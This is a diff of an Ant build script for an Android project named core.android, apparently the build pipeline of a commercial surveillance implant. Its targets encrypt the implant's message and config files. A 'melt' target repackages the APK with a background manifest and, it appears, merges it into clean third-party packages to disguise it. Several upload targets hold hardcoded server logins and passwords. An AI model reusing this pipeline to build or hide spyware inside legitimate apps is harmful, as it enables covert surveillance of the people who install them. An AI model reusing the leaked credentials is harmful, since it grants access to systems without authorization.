@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<project name="android_networking" default="help">
+<project name="android_deviceinfo" default="help">
 
 	<taskdef resource="net/sf/antcontrib/antlib.xml">
 		<classpath>
@@ -29,20 +29,21 @@
 		</classpath>
 	</taskdef>
 
-    <copy file="preprocess/local_properties.txt" tofile="local.properties" overwrite="false"/>
+	<copy file="preprocess/local_properties.txt" tofile="local.properties" overwrite="false" />
 	<loadproperties srcFile="local.properties" />
 	<property file="ant.properties" />
 	<loadproperties srcFile="project.properties" />
 
-	<property name="rcscore.path" value="antlibs"/>
+	<property name="rcscore.path" value="antlibs" />
 	<property name="out.dir" value="bin" />
 	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />
 
 	<import file="custom_rules.xml" optional="true" />
+	<!--
 	<target name="release" depends="-set-release-mode, -release-prompt-for-password, -package, -post-package, -post-build" />
 	<target name="debug" depends="-set-debug-mode, -set-debug-files, -package, -post-package, -post-build" />
 	<target name="instrument" depends="-set-instrumented-mode, debug" />
-	<!--
+	
  -->
 
 	<import file="${sdk.dir}/tools/ant/build.xml" />
@@ -76,11 +77,11 @@
 	</target>
 
 	<target name="encrypt-messages" depends="salt">
-        <mkdir dir="assets" />
-    
+		<mkdir dir="assets" />
+
 		<delete file="res/raw/messages.bin" />
 		<delete file="assets/m.bin" />
-        
+
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyMessages}" inputFile="preprocess/messages.properties.all" outputFile="assets/m.bin" />
 		<delete file="res/raw/statusdb.bin" />
 		<delete file="assets/s.bin" />
@@ -241,7 +242,7 @@
 					<filter token="RNDMSG" value="${randomKeyMessages}" />
 				</filterset>
 			</copy>
-			
+
 		</sequential>
 	</macrodef>
 
@@ -289,8 +290,8 @@
 	<target name="reverse">
 		<echo message="Reverse" />
 		<deltree dir="reverse" />
-		<copy file="bin/android_networking-release.apk" toDir="reverse" />
-		<unzip src="reverse/android_networking-release.apk" dest="reverse" />
+		<copy file="bin/android_deviceinfo-release.apk" toDir="reverse" />
+		<unzip src="reverse/android_deviceinfo-release.apk" dest="reverse" />
 
 		<exec executable="..\..\HT\Reversing\dex2jar\dex2jar.bat">
 			<arg value="reverse/classes.dex" />
@@ -341,7 +342,7 @@
 		<set-cfg kind="merge" osversion="v2">
 		</set-cfg>
 	</target>
-	
+
 	<target name="set-merge-debug" depends="init">
 		<set-cfg kind="merge_debug" osversion="v2">
 		</set-cfg>
@@ -352,9 +353,50 @@
 		</set-cfg>
 	</target>
 
-	<target name="build" depends="init">
+
+	<target name="init_build" depends="clean">
 		<buildnumber />
 		<delete dir="output" />
+		<echo message="==============" />
+		<echo message="===  BUILD ===" />
+		<echo message="==============" />
+
+	</target>
+
+	<target name="build_var">
+		<echo>Version @{osversion}</echo>
+		<var name="kind" value="debug" />
+
+		<echo>clean</echo>
+		<antcall target="clean" />
+
+		<echo message="bin/@{osversion}/@{kind}/core.android" />
+		<set-cfg osversion="@{osversion}" kind="@{kind}" />
+
+		<echo>call release</echo>
+		<antcall target="release" inheritAll="false" />
+		<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
+		<var name="filename" value="bin/android_deviceinfo-release.apk" />
+
+		<mkdir dir="output/@{kind}/" />
+		<copy file="${filename}" toFile="output/@{kind}/core.android.@{osversion}.apk" overwrite="true" />
+	</target>
+
+	<target name="build_default" depends="init_build">
+		<var name="osversion" value="default" />
+		<antcall target="build_var" />
+	</target>
+
+	<target name="build_v2" depends="init_build">
+		<var name="osversion" value="v2" />
+		<antcall target="build_var" />
+	</target>
+
+	<target name="build_nowork" depends="init,build_default,build_v2,merge">
+	</target>
+
+	<target name="build" depends="init">
+
 		<for list="default,v2" param="osversion">
 			<sequential>
 				<echo message="==============" />
@@ -362,51 +404,35 @@
 				<echo message="==============" />
 				<echo>Version @{osversion}</echo>
 
-				<for list="release" param="kind">
-					<sequential>
-                        <echo>clean</echo>
-						<antcall target="clean" />
+				<var name="kind" value="release" />
 
-						<echo message="bin/@{osversion}/@{kind}/core.android" />
-						<set-cfg osversion="@{osversion}" kind="@{kind}" />
+				<echo>clean</echo>
+				<antcall target="clean" />
 
-						<iff>
-							<equals arg1="@{kind}" arg2="debug" />
-							<then>
-								<echo message="==============" />
-								<echo>call debug</echo>
-								<antcall target="debug" inheritAll="false" />
-                                <!-- <var name="filename" value="bin/android_networking-debug-unaligned.apk" /> -->
-								<var name="filename" value="bin/android_networking-debug.apk" />
+				<echo message="bin/@{osversion}/${kind}/core.android" />
+				<set-cfg osversion="@{osversion}" kind="${kind}" />
 
-							</then>
-							<else>
-								<echo message="==============" />
-								<echo>call release</echo>
-								<antcall target="release" inheritAll="false" />
-                                <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
-								<var name="filename" value="bin/android_networking-release.apk" />
-							</else>
-						</iff>
+				<echo>call release</echo>
+				<antcall target="release" inheritAll="false" />
+				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
+				<var name="filename" value="bin/android_deviceinfo-release.apk" />
 
-						<mkdir dir="output/@{kind}/" />
-						<copy file="${filename}" toFile="output/@{kind}/core.android.@{osversion}.apk" overwrite="true" />
-					</sequential>
-				</for>
+				<mkdir dir="output/${kind}/" />
+				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
 			</sequential>
 
 		</for>
 
 		<antcall target="merge" />
 	</target>
-	
-	<target name="repackmerge" >
+
+	<target name="repackmerge">
 		<java fork="true" jar="server/core/apktool.jar" dir="output/merge">
-			<arg line="d -r -s -f core.android.melt.apk"/>
+			<arg line="d -r -s -f core.android.melt.apk" />
 		</java>
 		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="output/merge/core.android.melt/AndroidManifest.xml" overwrite="true" />
 		<java fork="true" jar="server/core/apktool.jar" dir="output/merge">
-			<arg line="b -f core.android.melt.pre core.android.melt.apk"/>
+			<arg line="b -f core.android.melt.pre core.android.melt.apk" />
 		</java>
 	</target>
 
@@ -416,29 +442,29 @@
 		<echo message="==============" />
 		<echo>BUILD merge</echo>
 		<antcall target="release" inheritAll="false" />
-        <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
-		<var name="filename" value="bin/android_networking-release.apk" />
+		<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
+		<var name="filename" value="bin/android_deviceinfo-release.apk" />
 		<mkdir dir="output/merge/" />
-		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />		
+		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />
 		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
-		
+
 		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
-	
+
 	<target name="merge_debug" depends="init">
 		<antcall target="clean" />
 		<set-cfg osversion="v2" kind="merge_debug" />
 		<echo message="==============" />
 		<echo>BUILD merge</echo>
 		<antcall target="debug" inheritAll="false" />
-        <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
-		<var name="filename" value="bin/android_networking-debug.apk" />
+		<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
+		<var name="filename" value="bin/android_deviceinfo-debug.apk" />
 		<mkdir dir="output/merge/" />
-		<copy file="${filename}" toFile="output/merge/core.android.melt.debug.apk" overwrite="true" />		
+		<copy file="${filename}" toFile="output/merge/core.android.melt.debug.apk" overwrite="true" />
 		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
 		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
-	
+
 	<target name="servercore">
 		<delete dir="server/core" />
 		<mkdir dir="server/core" />
@@ -453,11 +479,11 @@
 				<filter token="VERSION" value="${version}" />
 			</filterset>
 		</copy>
-				
+
 		<copy toDir="server/core" overwrite="true">
 			<fileset dir="output/release/" />
 		</copy>
-		
+
 		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
 		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="server/core/AndroidManifest.xml" overwrite="true" />
 
@@ -487,21 +513,21 @@
 		-->
 
 	</target>
-    
+
 	<target name="update">
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
 		<copy file="./server/android_${version}.zip" toFile="/Volumes/SHARE-1/RELEASE/SVILUPPO/cores daVinci/android.zip" overwrite="true" />
 	</target>
 
-	<target name="testcastore" depends="build" >
+	<target name="testcastore" depends="build">
 		<antcall target="servercore" />
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
 	</target>
-	
-	<target name="updatecastore"  >
-			<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
-		</target>
-	
+
+	<target name="updatecastore">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+	</target>
+
 	<target name="updatepolluce">
 		<updaterelease server="rcs-polluce" login="zeno" password="zenop123" file="server/android_${version}.zip" />
 	</target>
@@ -510,22 +536,22 @@
 		<updaterelease server="zeus" login="admin" password="adminp123" file="/server/android_${version}.zip" />
 		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
-	
+
 	<target name="updateminotauro">
 		<updaterelease server="rcs-minotauro" login="zeno" password="zenop123" file="server/android_${version}.zip" />
 	</target>
-    
-    <target name="ci">        
-        <echo>target ci</echo>
-        <copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="false"/>
-        <antcall target="build" />
-        <var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
+
+	<target name="ci">
+		<echo>target ci</echo>
+		<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="false" />
+		<antcall target="build" />
+		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
 		<echo>${destdir}</echo>
 		<mkdir dir="${destdir}" />
 
 		<antcall target="servercore" />
 		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
 		<antcall target="updateminotauro" />
-    </target>
+	</target>
 
 </project>
